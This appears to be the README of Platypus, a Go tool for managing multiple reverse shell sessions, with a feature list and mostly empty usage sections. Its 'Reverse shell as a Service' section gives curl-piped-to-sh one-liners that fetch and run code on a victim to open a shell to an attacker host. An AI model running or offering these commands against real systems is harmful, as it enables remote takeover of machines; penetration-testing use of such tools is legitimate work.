# Platypus

A modern multiple reverse shell sessions/clients manager via terminal written in go

#### Features
- [x] Multiple listening port
- [x] RESTful API
- [x] Upgrade common reverse shell session into full interactive session
- [x] Reverse shell as a service

#### Usage
```
# TODO
```

#### Example
```
# TODO
```

#### Reverse shell as a Service
```
# if you just want to mupliplexing the listening port
sh -c "$(curl http://reverse:port/)"
# victim will be redirected to attacker-host attacker-port
sh -c "$(curl http://reverse:port/attacker-host/attacker-port)"
```

#### TODO
- [ ] More interface in RESTful API
